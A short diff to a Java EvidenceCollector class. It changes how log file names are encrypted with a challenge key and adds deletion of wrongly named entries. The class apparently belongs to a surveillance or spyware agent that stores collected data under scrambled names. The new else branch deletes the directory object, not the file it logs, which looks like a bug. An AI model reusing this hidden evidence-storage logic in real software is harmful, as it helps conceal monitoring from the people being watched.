@@ -98,8 +98,9 @@ public class EvidenceCollector {
 	 * @return the string
 	 */
 	public static String encryptName(final String logMask) {
+		byte[] key = Keys.self().getChallengeKey();
 		return Encryption
-				.encryptName(logMask, Keys.self().getChallengeKey()[0]);
+				.encryptName(logMask, key[0]);
 	}
 
 	// public boolean storeToMMC;
@@ -255,11 +256,10 @@ public class EvidenceCollector {
 		final String fileName = paddedProgressive + "" + logType + ""
 				+ makeDateName(timestamp);
 
-		final String encName = Encryption.encryptName(fileName + LOG_EXTENSION,
-				seed);
+		final String encName = encryptName(fileName + LOG_EXTENSION);
 
 		// #ifdef DBC
-		Check.asserts(!encName.endsWith("MOB"), "makeNewName: " + encName
+		Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName
 				+ " ch: " + seed + " not scrambled: " + fileName
 				+ LOG_EXTENSION);
 		// #endif
@@ -459,6 +459,11 @@ public class EvidenceCollector {
 					// #endif
 
 					map.put(plainName, file);
+				}else{
+					// #ifdef DEBUG
+					debug.info("wrong name, deleting: " + file);
+					// #endif
+					fcDir.delete();
 				}
 			}
 
